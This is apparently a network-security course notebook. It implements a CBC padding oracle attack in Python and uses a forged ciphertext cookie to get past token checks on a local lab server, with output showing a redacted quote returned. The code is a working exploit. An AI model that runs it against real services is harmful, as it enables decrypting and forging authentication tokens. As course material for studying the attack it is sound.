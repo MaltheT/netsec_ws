{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "BLOCK_SIZE = 16\n",
    "\n",
    "\n",
    "def single_block_attack(block, oracle):\n",
    "    \"\"\"Returns the decryption of the given ciphertext block\"\"\"\n",
    "\n",
    "    # zeroing_iv starts out nulled. each iteration of the main loop will add\n",
    "    # one byte to it, working from right to left, until it is fully populated,\n",
    "    # at which point it contains the result of DEC(ct_block)\n",
    "    zeroing_iv = [0] * BLOCK_SIZE\n",
    "\n",
    "    for pad_val in range(1, BLOCK_SIZE+1):\n",
    "        padding_iv = [pad_val ^ b for b in zeroing_iv]\n",
    "\n",
    "        for candidate in range(256):\n",
    "            padding_iv[-pad_val] = candidate\n",
    "            iv = bytes(padding_iv)\n",
    "            if oracle(iv, block):\n",
    "                if pad_val == 1:\n",
    "                    # make sure the padding really is of length 1 by changing\n",
    "                    # the penultimate block and querying the oracle again\n",
    "                    padding_iv[-2] ^= 1\n",
    "                    iv = bytes(padding_iv)\n",
    "                    if not oracle(iv, block):\n",
    "                        continue  # false positive; keep searching\n",
    "                break\n",
    "        else:\n",
    "            raise Exception(\"no valid padding byte found (is the oracle working correctly?)\")\n",
    "\n",
    "        zeroing_iv[-pad_val] = candidate ^ pad_val\n",
    "\n",
    "    return zeroing_iv\n",
    "\n",
    "\n",
    "def full_attack(iv, ct, oracle):\n",
    "    \"\"\"Given the iv, ciphertext, and a padding oracle, finds and returns the plaintext\"\"\"\n",
    "    assert len(iv) == BLOCK_SIZE and len(ct) % BLOCK_SIZE == 0\n",
    "\n",
    "    msg = iv + ct\n",
    "    blocks = [msg[i:i+BLOCK_SIZE] for i in range(0, len(msg), BLOCK_SIZE)]\n",
    "    result = b''\n",
    "\n",
    "    # loop over pairs of consecutive blocks performing CBC decryption on them\n",
    "    iv = blocks[0]\n",
    "    for ct in blocks[1:]:\n",
    "        dec = single_block_attack(ct, oracle)\n",
    "        pt = bytes(iv_byte ^ dec_byte for iv_byte, dec_byte in zip(iv, dec))\n",
    "        result += pt\n",
    "        iv = ct\n",
    "\n",
    "    return result\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import sys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] done:\n",
      "<quote>\n",
      "<redacted> for testing purposes\n",
      "</quote>\n"
     ]
    }
   ],
   "source": [
    "srv_url = 'http://localhost:5000'\n",
    "\n",
    "def test_systems_security(base_url):\n",
    "    new_ciphertext = bytes.fromhex('2cc9a9fc7cb4dc60f1df7babc4bf82c1122b12cbd8a1c10e1d7f1d4cf57c60ed8cb3703e30ff4b1a2a9af418df999c71b331721a24e713668d0478351a4ccad77fa6abff498d919b3773e6e25fcad5556545a6339b9d4f42c854f96e940a538342424242424242424242424242424242')\n",
    "    res = requests.get(f'{base_url}/quote/', cookies={'authtoken': new_ciphertext.hex()})\n",
    "    print(f'[+] done:\\n{res.text}')\n",
    "\n",
    "test_systems_security(srv_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "netsec",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "965db81801b21ba7dc4c9685f596a42b49f128a4f56c74bc71bf76c87ae8c4d8"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
